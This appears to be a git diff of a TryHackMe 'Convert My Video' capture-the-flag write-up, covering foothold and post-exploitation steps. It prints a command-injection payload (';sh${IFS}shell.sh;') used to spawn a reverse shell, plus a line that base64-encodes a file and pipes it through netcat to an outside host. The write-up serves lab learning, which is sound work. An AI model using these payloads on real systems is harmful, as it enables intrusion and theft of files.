@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-03T11:52:35.090+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-04T20:32:14.762+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -222,7 +222,7 @@ For good sake, the content of the payload is confirmed.
 ![](/img/user/Attachments/foothold.png)
 
 ```bash
-sh${IFS}shell.sh
+;sh${IFS}shell.sh;
 ```
 
 So running above command in burp with nc listening will execute a rev shell. Time to do some post exploit.
@@ -263,8 +263,35 @@ find / -name ".*" -type d 2>/dev/null
 
 ![](/img/user/Attachments/hidden-dirs-search.png)
 
-Sure enough there might be some luck here. **.gnupg** looks of interest. 
+Unfortunately **.gnupg** is read/write only by root. 
 
+-----
+
+Thinking about the fact that the room uses a script on the webapp, this script might lead to valuable information. Let's look for it via the shell connection. 
+
+![](/img/user/Attachments/grep-for-yt-dl.png)
+
+```bash
+ps aux | grep yt-dl
+```
+ Knowing there is a parameter on this box namely `yt-dl` doing a grep search for it reveals it is indeed running a script named just that. 
+
+
+![315](/img/user/Attachments/youtube-dl.png)
+
+So let's identify which folder it's in. 
+
+```bash
+which youtube-dl 
+```
+
+This appears to be a python file in binary. Too large of a file to just cat the content. Unable to use strings since its not on the system. Unable to run python as a web server since http module is not installed.
+
+```bash
+base64 'file_goes_here' | nc <IP> <PORT> > saved_file
+```
+
+However base64 encoding the file and piping it to nc works just fine. Only downside is having to still manually cat the content of the file. Sadly examining the file on my machine doesnt reveal much. It does confirm that it is the same script running on the webapp. 
 
 
 ------
